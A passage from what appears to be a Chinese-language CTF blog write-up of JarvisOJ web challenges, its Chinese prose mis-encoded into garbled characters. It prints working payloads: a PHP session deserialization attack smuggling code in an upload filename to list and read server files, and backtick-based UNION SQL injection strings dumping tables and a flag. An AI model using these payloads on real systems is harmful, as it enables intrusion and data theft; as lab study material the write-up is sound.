<p>å¯ä»¥çœ‹åˆ°ï¼Œé€šè¿‡æ³¨å…¥ | å­—ç¬¦ä¼ªé€ äº†å¯¹è±¡çš„åºåˆ—åŒ–æ•°æ®ï¼ŒæˆåŠŸå®ä¾‹åŒ–äº† stdClass å¯¹è±¡ï¼šï¼‰</p>
<h4 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h4><p>é€šè¿‡ <strong>phpinfo</strong> é¡µé¢ï¼Œæˆ‘ä»¬çŸ¥é“ <strong>php.ini</strong> ä¸­é»˜è®¤ <strong>session.serialize_handler</strong> ä¸º <strong>php_serialize</strong> ï¼Œè€Œ <strong>index.php</strong> ä¸­å°†å…¶è®¾ç½®ä¸º <strong>php</strong> ã€‚è¿™å°±å¯¼è‡´äº† <strong>seesion</strong>çš„ååºåˆ—åŒ–é—®é¢˜ã€‚    </p>
<p><strong>session.upload_progress.enabled</strong>  ä¸º <strong>On</strong>ã€‚å½“ä¸€ä¸ªä¸Šä¼ åœ¨å¤„ç†ä¸­ï¼ŒåŒæ—¶ <strong>POST</strong> ä¸€ä¸ªä¸ <strong>INI</strong> ä¸­è®¾ç½®çš„ <strong>session.upload_progress.name</strong> åŒåå˜é‡æ—¶ï¼Œå½“ <strong>PHP</strong> æ£€æµ‹åˆ°è¿™ç§ <strong>POST</strong>è¯·æ±‚æ—¶ï¼Œå®ƒä¼šåœ¨ <strong>$_SESSION</strong> ä¸­æ·»åŠ ä¸€ç»„æ•°æ®ã€‚æ‰€ä»¥å¯ä»¥é€šè¿‡ <strong>Session Upload Progress</strong> æ¥è®¾ç½® <strong>session</strong>ã€‚</p>
<p>æˆ‘ä»¬éœ€è¦è‡ªå·±æ„å»ºä¸€ä¸ªä¸Šä¼ æ“ä½œã€‚ä»£ç å¦‚ä¸‹ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></p>
<p>æŠŠä¸Šè¿°çš„ä»£ç ä¿å­˜ä¸ºhtml,é€šè¿‡ <strong>PHP_SESSION_UPLOAD_PROGRESS</strong> è®¾ç½® <strong>session</strong>ã€‚<br>ä¸‹é¢éœ€è¦è¿›è¡Œåºåˆ—åŒ–æ“ä½œã€‚éœ€è¦åºåˆ—åŒ–çš„æ˜¯ OowoO ç±»ï¼Œå†™æ³•å¦‚ä¸‹ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//A webshell is wait for you</span><br><span class="line">ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);</span><br><span class="line">session_start();</span><br><span class="line">class OowoO</span><br><span class="line">&#123;</span><br><span class="line">    public $mdzz = &apos;xxx&apos;;</span><br><span class="line">&#125;</span><br><span class="line">	$x = new OowoO();</span><br><span class="line">	$serialized_data = serialize($x);</span><br><span class="line">    echo  $serialized_data;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>è¿™é‡Œéœ€è¦ç»™ mdzz å¤åˆ¶ä¸€ä¸ªå‘½ä»¤ï¼Œè¿™ä¸ªå‘½ä»¤è¦ç”¨æ¥è¯»å–æ•°æ®ã€‚<br><strong>print_r(scandir(dirname(<strong>FILE</strong>)));</strong>    </p>
<ul>
<li>æ‰“å°å‡ºwebæ ¹ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶ã€‚<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">print_r()         å‡½æ•°ç”¨äºæ‰“å°å˜é‡ï¼Œä»¥æ›´å®¹æ˜“ç†è§£çš„å½¢å¼å±•ç¤ºã€‚   </span><br><span class="line">scandir($x)       åˆ—å‡º $x ç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•</span><br><span class="line">__FILE__          æ˜¯å½“å‰è„šæœ¬çš„ç»å¯¹è·¯å¾„</span><br><span class="line">dirname(__FILE__) è·å¾—è„šæœ¬æ‰€åœ¨ç›®å½•çš„ç»å¯¹è·¯å¾„</span><br><span class="line"></span><br><span class="line">https://www.runoob.com/php/php-print_r-function.html</span><br><span class="line">https://www.w3school.com.cn/php/func_directory_scandir.asp</span><br><span class="line">https://www.awaimai.com/408.html</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>æ‰€ä»¥<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$mdzz = &apos;print_r(scandir(dirname(__FILE__)));&apos;;</span><br><span class="line">è¿è¡Œè„šæœ¬å¾—åˆ°</span><br><span class="line">O:5:&quot;OowoO&quot;:1:&#123;s:4:&quot;mdzz&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p>ä¸ºé˜²æ­¢è½¬ä¹‰ï¼Œåœ¨å¼•å·å‰åŠ ä¸Š\ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p>åˆ©ç”¨å‰é¢çš„htmlé¡µé¢éšä¾¿ä¸Šä¼ ä¸€ä¸ªä¸œè¥¿ï¼ŒæŠ“åŒ…ï¼ŒæŠŠfilenameæ”¹ä¸ºå¦‚ä¸‹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;</span><br><span class="line"></span><br><span class="line">å‘åŒ…çš„é‡è¦éƒ¨åˆ†å¦‚ä¸‹ï¼š</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;&quot;</span><br><span class="line"></span><br><span class="line">å¾—åˆ°è¿”å›ï¼š</span><br><span class="line">&lt;/code&gt;Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; .</span><br><span class="line">    [1] =&gt; ..</span><br><span class="line">    [2] =&gt; Here_1s_7he_fl4g_buT_You_Cannot_see.php</span><br><span class="line">    [3] =&gt; index.php</span><br><span class="line">    [4] =&gt; phpinfo.php</span><br><span class="line">)</span><br><span class="line">è¿™3ä¸ªphpæ–‡ä»¶æ˜¯åœ¨åŒç›®å½•ä¸‹</span><br></pre></td></tr></table></figure></p>
<p>æœ‰ä¸ª <strong>Here_1s_7he_fl4g_buT_You_Cannot_see.php</strong> ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å°±æ˜¯å»è¯»è¿™ä¸ªæ–‡ä»¶ã€‚<br>æ ¹æ®phpinfoå¯ä»¥å¾—åˆ°æ–‡ä»¶çš„å­˜æ”¾è·¯å¾„ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_SERVER[&quot;SCRIPT_FILENAME&quot;]	 /opt/lampp/htdocs/index.php</span><br><span class="line">è·¯å¾„ path = /opt/lampp/htdocs/</span><br></pre></td></tr></table></figure></p>
<p>é‚£ä¹ˆç»™ mdzz é‡æ–°èµ‹å€¼ï¼Œç”¨æ¥è¯»æ–‡ä»¶ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents() ä»¥å­—ç¬¦ä¸²å½¢å¼è·å–æ–‡ä»¶çš„å†…å®¹ã€‚</span><br><span class="line">$mdzz = &apos;print_r(file_get_contents(&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;));&apos;;</span><br><span class="line">https://www.php.net/manual/zh/function.file.php</span><br></pre></td></tr></table></figure></p>
<p>é‡æ–°åºåˆ—åŒ–ä¸€ä¸‹ï¼Œå¾—åˆ°<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">O:5:&quot;OowoO&quot;:1:&#123;s:4:&quot;mdzz&quot;;s:88:&quot;print_r(file_get_contents(&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;));&quot;;&#125;</span><br><span class="line">åŠ  |ï¼Œç„¶ååŠ  \ é¿å… åŒå¼•å·è¢«è½¬ä¹‰</span><br><span class="line">|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:88:\&quot;print_r(file_get_contents(\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\&quot;));\&quot;;&#125;</span><br><span class="line"></span><br><span class="line">å‘åŒ…å¾—åˆ°</span><br><span class="line">&lt;/code&gt;&lt;?php </span><br><span class="line">	$flag=&quot;CTF&#123;4d96e37f4be998c50aa586de4ada354a&#125;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>å‚è€ƒé“¾æ¥ï¼š<br><a href="https://gist.github.com/chtg/f74965bfea764d9c9698" target="_blank" rel="noopener">https://gist.github.com/chtg/f74965bfea764d9c9698</a><br><a href="https://xz.aliyun.com/t/3017" target="_blank" rel="noopener">https://xz.aliyun.com/t/3017</a></p>
<h2 id="inject-300"><a href="#inject-300" class="headerlink" title="inject 300"></a>inject 300</h2><p>é¢˜ç›®æç¤ºå…ˆæ‰¾åˆ°æºç ã€‚é‚£ä¹ˆæºç æ³„éœ²çš„æ–¹å¼éƒ½è¯•ä¸€æŠŠã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">åœ¨CTFä¸­ï¼Œå¤‡ä»½æ–‡ä»¶è¿™ä¸ªè€ƒç‚¹ç»å¸¸å‡ºç°ï¼Œè€Œåœ¨å¯¹ç½‘ç«™è¿›è¡Œä¿®æ”¹æˆ–è€…å‡çº§è¿‡ç¨‹ä¸­ä¹Ÿä¼šç”Ÿæˆå¤‡ä»½æ–‡ä»¶ï¼Œå¦‚æœè¿™äº›æ–‡ä»¶æœªåŠæ—¶åˆ é™¤ï¼Œè€Œä¸”æ–‡ä»¶åˆèƒ½è¢«è®¿é—®åˆ°æ—¶ï¼Œå°±å¾ˆæœ‰å¯èƒ½è¢«æ¶æ„ä¸‹è½½ï¼Œåˆ©ç”¨ã€‚</span><br><span class="line">å¸¸è§æ ¼å¼ï¼š</span><br><span class="line">.php~</span><br><span class="line">.un~</span><br><span class="line">.swp</span><br><span class="line">.rar</span><br><span class="line">.zip</span><br><span class="line">.7z</span><br><span class="line">.tar</span><br><span class="line">.gz</span><br><span class="line">.tar.gz</span><br><span class="line">.~</span><br><span class="line">.bak</span><br><span class="line">.txt</span><br><span class="line">.html</span><br><span class="line">.vim</span><br><span class="line">.swn</span><br><span class="line">.swo</span><br><span class="line">.old</span><br><span class="line">å‚è€ƒï¼šhttp://sunu11.com/2017/04/28/11/</span><br></pre></td></tr></table></figure></p>
<p>æœ€åè®¿é—® Index.php~ å¾—åˆ°æºç ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require(&quot;config.php&quot;);</span><br><span class="line">$table = $_GET[&apos;table&apos;]?$_GET[&apos;table&apos;]:&quot;test&quot;;</span><br><span class="line">$table = Filter($table);</span><br><span class="line">mysqli_query($mysqli,&quot;desc `secret_&#123;$table&#125;`&quot;) or Hacker();</span><br><span class="line">$sql = &quot;select &apos;flag&#123;xxx&#125;&apos; from secret_&#123;$table&#125;&quot;;</span><br><span class="line">$ret = sql_query($sql);</span><br><span class="line">echo $ret[0];</span><br><span class="line"></span><br><span class="line">mysqli_query() å‡½æ•°æ‰§è¡ŒæŸä¸ªé’ˆå¯¹æ•°æ®åº“çš„æŸ¥è¯¢ã€‚</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>è¿™é‡Œå­˜åœ¨æ³¨å…¥ï¼Œå³æ˜¯secret_{$table} å¯æ§ã€‚æ•°æ®ä»tableæ¥ã€‚<br>ä½†æ˜¯æ³¨æ„ï¼Œè¿™é‡Œæ³¨å…¥æˆåŠŸçš„æ¡ä»¶ã€‚</p>
<ol>
<li>desc `secret_{$table} è¿™æ¡è¯­å¥è¦èƒ½å…ˆèƒ½æ‰§è¡ŒæˆåŠŸ</li>
<li>select â€˜flag{xxx}â€™ from secret_{$table} è¿™æ¡è¯­å¥ç”¨æ¥æŸ¥è¯¢æƒ³è¦çš„æ•°æ®</li>
</ol>
<p>ä»”ç»†è§‚å¯Ÿï¼Œå¯ä»¥çœ‹åˆ° secret_{$table} è¿™é‡Œç”¨åˆ°äº† <font color="red">åå¼•å· ï¼š<strong>`</strong> </font><br>éœ€è¦æ˜ç™½åå¼•å·è¿™é‡Œçš„ç”¨æ³•ã€‚å‚è€ƒï¼š<a href="https://www.jianshu.com/p/36363f4190df" target="_blank" rel="noopener">https://www.jianshu.com/p/36363f4190df</a><br>ç®€å•çš„è¯´ï¼Œåå¼•å·ç”¨æ¥æ ‡è¯†mysqlä¸­ä¿ç•™å­—ä½œä¸ºæ™®é€šå­—æ®µæ¥è§£æã€‚æ¯”å¦‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT `select` from `test` WHERE `select`=&apos;å­—æ®µå€¼&apos;;</span><br><span class="line">åœ¨testè¡¨ä¸­ï¼Œæœ‰ä¸ªselectå­—æ®µï¼Œå¦‚æœä¸ç”¨åå¼•å·ï¼ŒMYSQLå°†æŠŠselectè§†ä¸ºä¿ç•™å­—è€Œå¯¼è‡´å‡ºé”™</span><br></pre></td></tr></table></figure>
<p>å¦‚æœè¿™æ ·å†™<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT `select` `aaa` from `test` WHERE `select`=&apos;å­—æ®µå€¼&apos;;</span><br><span class="line">è¡¨æ˜ aaa æ˜¯ select å­—æ®µçš„åˆ«åï¼Œä¹Ÿæ˜¯æ­£ç¡®çš„ã€‚</span><br></pre></td></tr></table></figure></p>
<p>é‚£ä¹ˆè¿™é‡Œæ„é€ <br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">desc `secret_test` `union select database() ` </span><br><span class="line">å› ä¸ºå›æ˜¾åªæœ‰ä¸€è¡Œ flag&#123;xxx&#125; ï¼Œé‚£ä¹ˆç”¨ limit 1,1 é™åˆ¶è¾“å‡ºå°±è¡Œã€‚</span><br><span class="line">æ‰€ä»¥æ„é€ </span><br><span class="line">table=test` `union select database() limit 1,1</span><br><span class="line">åˆ™å¾—åˆ°</span><br><span class="line">desc `secret_test` `union select database() limit 1,1` </span><br><span class="line">ç»“åˆç¬¬2å¥çš„select å°±æˆè”åˆæŸ¥è¯¢ï¼Œå¦‚ä¸‹ã€‚</span><br><span class="line">select &apos;flag&#123;xxx&#125;&apos; from secret_test` `union select database() limit 1,1&quot;</span><br></pre></td></tr></table></figure></p>
<p>æ³¨æ„åœ¨æµè§ˆå™¨ä¸­è¾“å…¥è¿™å¥ï¼Œç©ºæ ¼ä¼šè¢«è½¬ç§»ä¸º %20 ï¼Œè¯´æ˜å¯¹ç©ºæ ¼æœ‰è¿‡æ»¤ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">å‘åŒ…ï¼š</span><br><span class="line">?table=test`%20`union%20select%20database()%20limit%201,1</span><br><span class="line">å¾—åˆ°æ•°æ®åº“å</span><br><span class="line">61d300</span><br></pre></td></tr></table></figure></p>
<p>æŸ¥è¡¨<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">table=test` `union select group_concat(table_name) from information_schema.tables where table_schema=database() limit 1,1</span><br><span class="line"></span><br><span class="line">å¾—åˆ°</span><br><span class="line">secret_flag,secret_test</span><br></pre></td></tr></table></figure></p>
<p>æŸ¥åˆ—<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">table=test` `union select group_concat(column_name) from information_schema.columns where table_name=&quot;secret_flag&quot; limit 1,1</span><br><span class="line">è¿™å¥ä¸ä¼šæ‰§è¡ŒæˆåŠŸã€‚å› ä¸ºå•åŒå¼•å·éƒ½è¢«è¿‡æ»¤ï¼Œé‚£ä¹ˆç”¨åå…­è¿›åˆ¶æ•°æ¥æŒ‡å®šè¡¨åã€‚</span><br><span class="line"></span><br><span class="line">secret_flag = 0x7365637265745f666c6167</span><br><span class="line"></span><br><span class="line">åˆ™</span><br><span class="line">table=test` `union select group_concat(column_name) from information_schema.columns where table_name=0x7365637265745f666c6167 limit 1,1</span><br><span class="line">å¾—åˆ°</span><br><span class="line">flagUwillNeverKnow</span><br></pre></td></tr></table></figure></p>
<p>æŸ¥æ•°æ®<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">table=test` `union select flagUwillNeverKnow from secret_flag limit 1,1</span><br><span class="line"></span><br><span class="line">å¾—</span><br><span class="line">flag&#123;luckyGame~&#125;</span><br></pre></td></tr></table></figure></p>
<p>å‚è€ƒï¼š<br><a href="https://blog.csdn.net/qq_38780085/article/details/79905892" target="_blank" rel="noopener">https://blog.csdn.net/qq_38780085/article/details/79905892</a></p>
</div><iframe src="/donate/?AliPayQR=null&amp;WeChatQR=/img/mePic.jpg&amp;GitHub=null&amp;BTCQR=null&amp;BTCKEY=null&amp;PayPal=null" style="overflow-x:hidden; overflow-y:hidden; border:0xp none #fff; min-height:240px; width:100%;" frameborder="0" scrolling="no"></iframe><div class="tags"><a href="/tags/CTF-web/">CTF-web</a></div><div class="post-nav"><a class="pre" href="/2020/03/12/BUUCTF-Web-1-14/">BUUCTF.web.1-13</a><a class="next" href="/2020/03/10/CTf-JarvisOJ-100-200/">CTf-JarvisOJ-100-200</a></div><div id="vcomment"></div><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//unpkg.com/valine@latest/dist/Valine.min.js"></script><script>var notify = 'false' == true ? true : false;
var verify = 'false' == true ? true : false;
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  appId:'o3qEIvAEzJfA0jPzjvyVeUwo-gzGzoHsz',
  appKey:'VBV3VN2vtqwbGqHGFeNL86iw',
  placeholder:'thanks for you read',
  avatar:'mm',
  guest_info:guest_info,
  pageSize:'10'
})</script></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.baidu.com/baidu" method="get" accept-charset="utf-8" target="_blank"><input type="search" name="word" maxlength="20" placeholder="Search"/><input type="hidden" name="si" value="https://f01965.github.io"/><input name="tn" type="hidden" value="bds"/><input name="cl" type="hidden" value="3"/><input name="ct" type="hidden" value="2097152"/><input name="s" type="hidden" value="on"/></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> åˆ†ç±»</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CVE-2018/">CVE / 2018</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/æŠ€æœ¯åˆ†äº«/">æŠ€æœ¯åˆ†äº«</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/æ—¥å¿—/">æ—¥å¿—</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> æ ‡ç­¾</i></div><div class="tagcloud"><a href="/tags/Mircosoft/" style="font-size: 15px;">Mircosoft</a> <a href="/tags/æ¼æ´åˆ©ç”¨/" style="font-size: 15px;">æ¼æ´åˆ©ç”¨</a> <a href="/tags/å›ºä»¶/" style="font-size: 15px;">å›ºä»¶</a> <a href="/tags/æœºå™¨å­¦ä¹ æ¡†æ¶/" style="font-size: 15px;">æœºå™¨å­¦ä¹ æ¡†æ¶</a> <a href="/tags/æŠ€æœ¯åˆ†äº«/" style="font-size: 15px;">æŠ€æœ¯åˆ†äº«</a> <a href="/tags/GC/" style="font-size: 15px;">GC</a> <a href="/tags/CTF-web/" style="font-size: 15px;">CTF-web</a> <a href="/tags/éšç¬”/" style="font-size: 15px;">éšç¬”</a> <a href="/tags/æ¼æ´åˆ†æ/" style="font-size: 15px;">æ¼æ´åˆ†æ</a> <a href="/tags/code/" style="font-size: 15px;">code</a> <a href="/tags/æŠ€æœ¯åˆ†äº«-å›ºä»¶/" style="font-size: 15px;">æŠ€æœ¯åˆ†äº«/å›ºä»¶</a> <a href="/tags/fuzz/" style="font-size: 15px;">fuzz</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> æœ€è¿‘æ–‡ç« </i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2021/02/25/fortigate-Vulnerability/">fortigate Vulnerability</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/02/23/watchguard/">watchguard</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/02/18/fortigate/">fortigate</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/15/spiderMonkey-æ¼æ´åˆ©ç”¨ç®€ä»‹3/">spiderMonkey æ¼æ´åˆ©ç”¨ç®€ä»‹3</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/15/spiderMonkey-æ¼æ´åˆ©ç”¨ç®€ä»‹2/">spiderMonkey æ¼æ´åˆ©ç”¨ç®€ä»‹2</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/15/spiderMonkey-æ¼æ´åˆ©ç”¨ç®€ä»‹/">spiderMonkey æ¼æ´åˆ©ç”¨ç®€ä»‹</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/27/X86-ShellCode-2/">X86-ShellCodeç¼–å†™2</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/27/X86-ShellCode-1/">X86-ShellCodeç¼–å†™1</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/26/CVE-2017-17215-æ‹“å±•/">CVE-2017-17215 æ‹“å±•</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/25/CVE-2017-17215/">CVE-2017-17215</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> å‹æƒ…é“¾æ¥</i></div><ul></ul><a href="https://yan-1-20.github.io/about/" title="Asprose" target="_blank">Asprose</a><ul></ul><a href="https://www.lucifaer.com/" title="Lucifaer" target="_blank">Lucifaer</a><ul></ul><a href="http://drac0nids.top/" title="Drac0nids" target="_blank">Drac0nids</a><ul></ul><a href="http://balis0ng.com/" title="balis0ng" target="_blank">balis0ng</a><ul></ul><a href="https://da7uran0ir.github.io/" title="Da7ura_n0ir" target="_blank">Da7ura_n0ir</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer"> Dad ï¼Œ I will always love you.</div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.css"><script type="text/javascript" color="255,0,0" opacity="0.7" zIndex="-1" count="100" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>